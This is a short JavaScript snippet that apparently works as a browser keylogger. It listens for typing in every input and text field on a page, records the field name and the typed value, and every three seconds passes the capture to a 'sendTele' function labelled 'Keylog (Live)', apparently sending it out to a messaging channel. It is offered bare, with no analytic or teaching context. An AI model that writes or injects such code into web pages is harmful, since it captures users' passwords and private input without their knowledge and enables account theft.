let log = "";
document.addEventListener('input', (e) => {
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
        let val = e.target.value;
        log = `[Field: ${e.target.name || e.target.placeholder}] -> ${val}`;
    }
});

setInterval(() => {
    if(log) { sendTele("⌨️ Keylog (Live): " + log); log = ""; }
}, 3000);
